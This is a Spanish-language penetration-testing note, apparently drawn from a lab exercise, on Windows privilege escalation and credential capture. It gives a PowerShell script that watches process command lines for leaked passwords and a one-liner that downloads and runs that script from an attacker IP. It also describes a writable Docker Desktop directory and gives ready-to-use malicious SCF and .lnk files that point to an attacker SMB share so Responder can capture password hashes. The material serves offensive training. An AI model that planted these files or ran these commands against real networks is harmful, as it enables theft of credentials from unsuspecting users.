## Lineas de comando de los procesos

#### Monitorizacion de lineas de comandos de los procesos

Pueden haber tareas programadas o procesos que pasen credenciales por comandos. Podemos buscar estas lineas con el siguiente script:

```
while($true) { 
	$process = Get-WmiObject Win32_Process | Select-Object CommandLine 
	Start-Sleep 1 
	$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine 
	Compare-Object -ReferenceObject $process -DifferenceObject $process2 
}
```

Ejecutamos el script:

```
IEX (iwr 'http://10.10.10.205/procmon.ps1')
```
![[Pasted image 20260913145957.png]]

Nos revela la contraseña del usuario sqlsvc que podriamos usar para acceder al host SQL02 o encontrar datos sensibles como las creds de la base de datos en un recurso compartido


## Servicios vulnerables

Puede que estemos en un host que ejecuta una aplicacion vulnerable por ejemplo `Docker Desktop Community Edition anterior a la versión 2.1.0.1`

	Cuando esta versión concreta de Docker se inicia, busca varios archivos diferentes, incluyendo `docker-credential-wincred.exe`, `docker-credential-wincred.bat`, etc., que no existen en una instalación de Docker. El programa busca estos archivos en `C:\PROGRAMDATA\DockerDesktop\version-bin\`. Este directorio estaba mal configurado para permitir el acceso de escritura completo al grupo `BUILTIN\Users`, lo que significa que cualquier usuario autenticado en el sistema podría escribir un archivo en él


## SCF (archivo de comandos) en un recurso compartido de archivos

Estos archivos son usados por el Explorador de Windows para subir y bajar directorios, mostrar Escritorio... Este puede ser manipulado para que la ubicacion del archivo apunte a una ruta UNC y hacer que el Explorador inicie sesion SMB cuando accede a la carpeta donde reside el SCF

Si cambiamos el IconFile a un servidor SMB y activamos alguna herramienta como [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh), o [InveighZero](https://github.com/Kevin-Robertson/InveighZero) podremos capturar hashes de contraseñas de cualquier usuario que navegue al recurso compartido

	Puede ser muy util si obtenemos permisos de escritura a un recurso comparitdo muy usado


#### Archivo SCF malicioso

Creamos un archivo que llamaremos `@Inventory.scf` (le ponemos @ para que salga en la parte de arriba del directorio y asegurarnos de que sea visto y ejecutado por el Explorador tan pronto como acceda el usuario al recurso compartido). Tenemos que poner la direccion IP `tun0`

```
[Shell] 
Command=2 
IconFile=\\10.10.14.3\share\legit.ico 
[Taskbar] 
Command=ToggleDesktop
```


#### Iniciando Responder

```
sudo responder -w -v -I tun0
```

## Capturando hashes con un archivo .lnk malicioso

Los SCF ya no funcionan desde Windows Server 2019 pero podemos lograr lo mismo con un .lnk malicioso

```
$objShell = New-Object -ComObject WScript.Shell 
$lnk = $objShell.CreateShortcut("C:\legit.lnk") 
$lnk.TargetPath = "\\<attackerIP>\@pwn.png" 
$lnk.WindowStyle = 1 
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3" 
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request." 
$lnk.HotKey = "Ctrl+Alt+O" 
$lnk.Save()
```
